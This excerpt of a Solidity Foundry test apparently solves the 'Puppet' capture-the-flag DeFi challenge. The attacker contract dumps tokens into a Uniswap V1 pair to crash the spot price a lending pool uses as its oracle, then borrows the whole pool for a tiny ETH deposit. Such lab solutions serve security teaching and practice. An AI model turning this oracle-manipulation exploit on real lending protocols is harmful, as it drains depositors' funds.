...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        // Aegis sweep -> mango/loopscale spot-price manipulation: PuppetPool prices the token off the
        // Uniswap V1 reserve ratio (ETH bal / token bal). Dump tokens to crash the price, then borrow
        // the whole pool for a tiny ETH deposit. Player nonce must be 1 -> one CREATE; the rest are calls.
        PuppetAttacker a = new PuppetAttacker{value: player.balance}();
        token.approve(address(a), token.balanceOf(player));
        a.execute(token, lendingPool, IUniswapV1Exchange(address(uniswapV1Exchange)), recovery, player);
    }
...
contract PuppetAttacker {
    ...
    function execute(
        ...
        uint256 tokenBal = token.balanceOf(player);
        token.transferFrom(player, address(this), tokenBal);
        token.approve(address(exchange), tokenBal);
        exchange.tokenToEthSwapInput(tokenBal, 1, block.timestamp + 1); // crash the token price
        uint256 poolTokens = token.balanceOf(address(pool));
        uint256 dep = pool.calculateDepositRequired(poolTokens);
        pool.borrow{value: dep}(poolTokens, recovery); // borrow the whole pool to recovery
    }
